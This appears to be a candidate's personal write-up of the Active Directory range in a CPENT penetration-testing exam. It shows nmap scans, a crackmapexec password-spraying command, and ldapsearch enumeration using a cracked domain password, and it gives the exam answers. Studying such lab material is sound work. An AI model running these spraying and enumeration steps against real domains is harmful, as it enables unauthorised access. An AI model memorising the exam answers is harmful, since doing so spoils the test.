---
title: "AD Range - 270 Points"
kind: exam
tags:
  - cpent-exam
  - exam
area: "CPENT Exam"
up: "[[CPENT Exam]]"
notion-id: 8d4759b927518306b80b0121fe93ff48
---

# AD Range - 270 Points

In: [[Career]] / [[CPENT Exam]]

Challenge 1: (30 Points)
Determine the first six characters of the local Administrator account password on the client machine in the CPENTV2025 domain. (Answer Format: XxxxNx)

```bash
┌──(exp10i73r㉿kali)-[~/CPENT/AD]
└─$ nmap -sn 172.25.170.0/24 --exclude 172.25.170.1,172.25.170.250 -oA discovery
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-03 19:00 +0530
Nmap scan report for 172.25.170.12
Host is up (0.16s latency).
Nmap scan report for 172.25.170.50
Host is up (0.13s latency).
Nmap scan report for 172.25.170.140
Host is up (0.13s latency).
Nmap scan report for 172.25.170.200
Host is up (0.13s latency).
Nmap done: 254 IP addresses (4 hosts up) scanned in 16.21 seconds
                                                                                                                                         
┌──(exp10i73r㉿kali)-[~/CPENT/AD]
└─$ grep "Status: Up" discovery.gnmap | cut -d' ' -f2 > live_hosts.txt
cat live_hosts.txt
172.25.170.12
172.25.170.50
172.25.170.140
172.25.170.200

┌──(exp10i73r㉿kali)-[~/CPENT/AD]
└─$ nmap -Pn -p- --min-rate 2000 -T4 -iL live_hosts.txt -oA fullscan        
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-03 19:01 +0530
Stats: 0:01:03 elapsed; 0 hosts completed (4 up), 4 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 36.69% done; ETC: 19:04 (0:01:47 remaining)
Stats: 0:01:58 elapsed; 0 hosts completed (4 up), 4 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 69.26% done; ETC: 19:04 (0:00:52 remaining)
Stats: 0:02:26 elapsed; 0 hosts completed (4 up), 4 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 86.07% done; ETC: 19:04 (0:00:23 remaining)
Stats: 0:02:42 elapsed; 0 hosts completed (4 up), 4 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 86.74% done; ETC: 19:04 (0:00:24 remaining)
Nmap scan report for 172.25.170.12
Host is up (0.13s latency).
Not shown: 65494 closed tcp ports (reset)
PORT      STATE SERVICE
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
1801/tcp  open  msmq
2103/tcp  open  zephyr-clt
2105/tcp  open  eklogin
2107/tcp  open  msmq-mgmt
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
16450/tcp open  unknown
16453/tcp open  unknown
17001/tcp open  unknown
22635/tcp open  unknown
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49672/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49682/tcp open  unknown
49688/tcp open  unknown
49689/tcp open  unknown
49693/tcp open  unknown
49703/tcp open  unknown
50079/tcp open  unknown
50082/tcp open  unknown

Nmap scan report for 172.25.170.50
Host is up (0.14s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown
49783/tcp open  unknown
63614/tcp open  unknown

Nmap scan report for 172.25.170.140
Host is up (0.13s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown

Nmap scan report for 172.25.170.200
Host is up (0.13s latency).
Not shown: 65499 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
1801/tcp  open  msmq
2103/tcp  open  zephyr-clt
2105/tcp  open  eklogin
2107/tcp  open  msmq-mgmt
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
3790/tcp  open  quickbooksrds
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
52534/tcp open  unknown
54949/tcp open  unknown
61245/tcp open  unknown
61246/tcp open  unknown
61251/tcp open  unknown
61256/tcp open  unknown
61357/tcp open  unknown

Nmap done: 4 IP addresses (4 hosts up) scanned in 204.80 seconds
                                                                                                                                         
┌──(exp10i73r㉿kali)-[~/CPENT/AD]
└─$ nmap -Pn -sV -sC -iL live_hosts.txt --open -oA svc_scan
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-03 19:04 +0530
Stats: 0:00:03 elapsed; 0 hosts completed (4 up), 4 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 3.09% done; ETC: 19:05 (0:00:31 remaining)
Stats: 0:00:46 elapsed; 0 hosts completed (4 up), 4 undergoing Service Scan
Service scan Timing: About 85.96% done; ETC: 19:05 (0:00:05 remaining)
Stats: 0:01:32 elapsed; 0 hosts completed (4 up), 4 undergoing Script Scan
NSE Timing: About 98.33% done; ETC: 19:06 (0:00:00 remaining)
Stats: 0:02:02 elapsed; 0 hosts completed (4 up), 4 undergoing Script Scan
NSE Timing: About 99.99% done; ETC: 19:07 (0:00:00 remaining)
Nmap scan report for 172.25.170.12
Host is up (0.13s latency).
Not shown: 980 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          Microsoft ESMTP 10.0.17763.1
| smtp-commands: RangeADServer19.CPENTv2025.com Hello [172.27.232.2], TURN, SIZE 2097152, ETRN, PIPELINING, DSN, ENHANCEDSTATUSCODES, 8bitmime, BINARYMIME, CHUNKING, VRFY, OK
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH TURN ETRN BDAT VRFY
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-03 13:35:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CPENTv2025.com, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2026-09-03T13:37:07+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   172.25.170.12\SQLEXPRESS: 
|     Target_Name: CPENTV2025
|     NetBIOS_Domain_Name: CPENTV2025
|     NetBIOS_Computer_Name: RANGEADSERVER19
|     DNS_Domain_Name: CPENTv2025.com
|     DNS_Computer_Name: RangeADServer19.CPENTv2025.com
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-09-03T09:32:55
|_Not valid after:  2056-09-03T09:32:55
| ms-sql-info: 
|   172.25.170.12\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: CPENTv2025.com, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CPENTV2025
|   NetBIOS_Domain_Name: CPENTV2025
|   NetBIOS_Computer_Name: RANGEADSERVER19
|   DNS_Domain_Name: CPENTv2025.com
|   DNS_Computer_Name: RangeADServer19.CPENTv2025.com
|   Product_Version: 10.0.17763
|_  System_Time: 2026-09-03T13:36:28+00:00
|_ssl-date: 2026-09-03T13:37:06+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=RangeADServer19.CPENTv2025.com
| Not valid before: 2026-06-22T06:43:13
|_Not valid after:  2026-12-22T06:43:13
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Hosts: RangeADServer19.CPENTv2025.com, RANGEADSERVER19; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-03T13:36:24
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Nmap scan report for 172.25.170.50
Host is up (0.13s latency).
Not shown: 988 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-03 13:35:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CPENTv2025.com, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: CPENTV2025)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: CPENTv2025.com, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CPENTV2025
|   NetBIOS_Domain_Name: CPENTV2025
|   NetBIOS_Computer_Name: AD-WIN
|   DNS_Domain_Name: CPENTv2025.com
|   DNS_Computer_Name: AD-WIN.CPENTv2025.com
|   Product_Version: 10.0.14393
|_  System_Time: 2026-09-03T13:36:25+00:00
|_ssl-date: 2026-09-03T13:37:07+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=AD-WIN.CPENTv2025.com
| Not valid before: 2026-07-01T22:29:07
|_Not valid after:  2026-12-31T22:29:07
Service Info: Host: AD-WIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: AD-WIN
|   NetBIOS computer name: AD-WIN\x00
|   Domain name: CPENTv2025.com
|   Forest name: CPENTv2025.com
|   FQDN: AD-WIN.CPENTv2025.com
|_  System time: 2026-09-03T06:36:33-07:00
| smb2-time: 
|   date: 2026-09-03T13:36:29
|_  start_date: 2026-09-03T09:30:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 1h24m02s, deviation: 3h07m54s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Nmap scan report for 172.25.170.140
Host is up (0.14s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  tcpwrapped
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-09-03T13:37:06+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CPENTV2025
|   NetBIOS_Domain_Name: CPENTV2025
|   NetBIOS_Computer_Name: WINDOWS11
|   DNS_Domain_Name: CPENTv2025.com
|   DNS_Computer_Name: Windows11.CPENTv2025.com
|   Product_Version: 10.0.22000
|_  System_Time: 2026-09-03T13:36:26+00:00
| ssl-cert: Subject: commonName=Windows11.CPENTv2025.com
| Not valid before: 2026-07-01T22:10:33
|_Not valid after:  2026-12-31T22:10:33
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-09-03T13:36:39
|_  start_date: N/A

Nmap scan report for 172.25.170.200
Host is up (0.13s latency).
Not shown: 981 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-03 13:35:27Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CPENTv2025.com, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Windows Server 2022 Standard 20348 microsoft-ds (workgroup: CPENTV2025)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-09-03T09:32:39
|_Not valid after:  2056-09-03T09:32:39
|_ssl-date: 2026-09-03T13:37:06+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   172.25.170.200\SQLEXPRESS: 
|     Target_Name: CPENTV2025
|     NetBIOS_Domain_Name: CPENTV2025
|     NetBIOS_Computer_Name: ADRANGEBASE22
|     DNS_Domain_Name: CPENTv2025.com
|     DNS_Computer_Name: ADRANGEBASE22.CPENTV2025.com
|     DNS_Tree_Name: CPENTv2025.com
|_    Product_Version: 10.0.20348
| ms-sql-info: 
|   172.25.170.200\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: CPENTv2025.com, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CPENTV2025
|   NetBIOS_Domain_Name: CPENTV2025
|   NetBIOS_Computer_Name: ADRANGEBASE22
|   DNS_Domain_Name: CPENTv2025.com
|   DNS_Computer_Name: ADRANGEBASE22.CPENTV2025.com
|   DNS_Tree_Name: CPENTv2025.com
|   Product_Version: 10.0.20348
|_  System_Time: 2026-09-03T13:36:26+00:00
|_ssl-date: 2026-09-03T13:37:06+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ADRANGEBASE22.CPENTV2025.com
| Not valid before: 2026-06-22T06:43:15
|_Not valid after:  2026-12-22T06:43:15
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: ADRANGEBASE22; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1h00m02s, deviation: 2h38m50s, median: 0s
| smb2-time: 
|   date: 2026-09-03T13:36:39
|_  start_date: N/A
|_nbstat: NetBIOS name: ADRANGEBASE22, NetBIOS user: <unknown>, NetBIOS MAC: 00:15:5d:01:80:02 (Microsoft)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2022 Standard 20348 (Windows Server 2022 Standard 6.3)
|   Computer name: ADRANGEBASE22
|   NetBIOS computer name: ADRANGEBASE22\x00
|   Domain name: CPENTv2025.com
|   Forest name: CPENTv2025.com
|   FQDN: ADRANGEBASE22.CPENTV2025.com
|_  System time: 2026-09-03T06:36:39-07:00

Post-scan script results:
| clock-skew: 
|   1h24m02s: 
|     172.25.170.50
|     172.25.170.200
|     172.25.170.12
|_    172.25.170.140
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 150.65 seconds

```

### Challenge 1: (30 Points) Determine the first six characters of the local Administrator account password on the client machine in the CPENTV2025 domain. (Answer Format: XxxxNx)

```python
Pott3r
```

```bash
crackmapexec smb 172.25.170.140 -u Admin -p ../Passwords.txt --local-auth
```

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_19-19-06.png]]

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_19-23-26.png]]

### Challenge 2: (30 Points) Determine the first six characters of the password for the user Stewart in the CPENTV2025 domain. (Answer Format: XNxNxx)

```python
crackmapexec smb 172.25.170.50 172.25.170.200 -u Stewart -p ../Passwords.txt
```

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_19-35-18.png]]

### Challenge 3: (40 Points) What is the IP address of the RODC server in the CPENTV2025 domain that is managed by the domain user George? (Answer Format: NNN.NN.NNN.NN)

```bash
172.25.170.12
```

```bash
ldapsearch -x -H ldap://172.25.170.50 -D "Stewart@CPENTv2025.com" -w 'H3l3nn@123' \
  -b "DC=CPENTv2025,DC=com" \
  "(primaryGroupID=521)" dNSHostName managedBy sAMAccountName
  
  nslookup RangeADServer19.CPENTv2025.com 172.25.170.50
```

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_19-39-20.png]]

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_19-41-39.png]]

### Challenge 7: (30 Points) Determine the SAMAccountName of the RODC server with an RODC number of 32374. (Answer Format: XXXXXXXXXXXXXNN)

```bash
RANGEADSERVER19
```

```bash
ldapsearch -x -H ldap://172.25.170.50 -D "Stewart@CPENTv2025.com" -w 'H3l3nn@123' \
  -b "DC=CPENTv2025,DC=com" "(sAMAccountName=krbtgt_32374)" sAMAccountName distinguishedName

ldapsearch -x -H ldap://172.25.170.50 -D "Stewart@CPENTv2025.com" -w 'H3l3nn@123' \
  -b "DC=CPENTv2025,DC=com" "(primaryGroupID=521)" sAMAccountName dNSHostName msDS-KrbTgtLink

```

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_19-49-32.png]]

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_19-50-37.png]]

### Challenge 8: (40 Points) Determine the name of the domain user whose MsCacheV2 value ends with 262e11. (Answer Format: Xxxxxxx)

```bash
Stewart
```

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_19-55-05.png]]

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_19-59-35.png]]

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_20-02-08.png]]

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_20-01-41.png]]

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_20-03-12.png]]

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_20-04-28.png]]

### Challenge 9: (20 Points) Determine the fully qualified device name of the client VM in the CPENTV2025 domain. (Answer Format: [XxxxxxxNN.XXXXXxNNNN.xxx](http://xxxxxxxnn.xxxxxxnnnn.xxx/))

```bash
Windows11.CPENTv2025.com
```

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_20-09-41.png]]

### Challenge 10: (40 Points) Determine the domain username of the user who manages the RODC server at 172.25.170.50. (Answer Format: Xxxxxx)

```bash
Joshua
```

```bash
ldapsearch -x -H ldap://172.25.170.12 -D "Stewart@CPENTv2025.com" -w 'H3l3nn@123' \
  -b "DC=CPENTv2025,DC=com" "(cn=AD-WIN)" managedBy

```

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_20-13-22.png]]

### Challenge 11: (40 Points) Determine the number of users or groups included in the Allowed RODC Password Replication Policy (PRP) list on the RODC server at 172.25.170.12. (Answer Format: N)

```bash
3
```

```bash
ldapsearch -x -H ldap://172.25.170.12 -D "Stewart@CPENTv2025.com" -w 'H3l3nn@123' \
  -b "DC=CPENTv2025,DC=com" "(cn=RangeADServer19)" msDS-RevealOnDemandGroup

```

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_20-18-19.png]]

### Challenge 12: (100 Points) Perform a Key List attack on the RODC and determine the first three characters of the Writable Domain Controller's Administrator account password. (Answer Format: XXX) - not solved

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_21-02-41.png]]

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_21-02-14.png]]

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-03_at_21-00-49.png]]

![[attachments/CPENT Exam/AD Range - 270 Points/Screenshot_2026-09-04_at_00-48-02.png]]
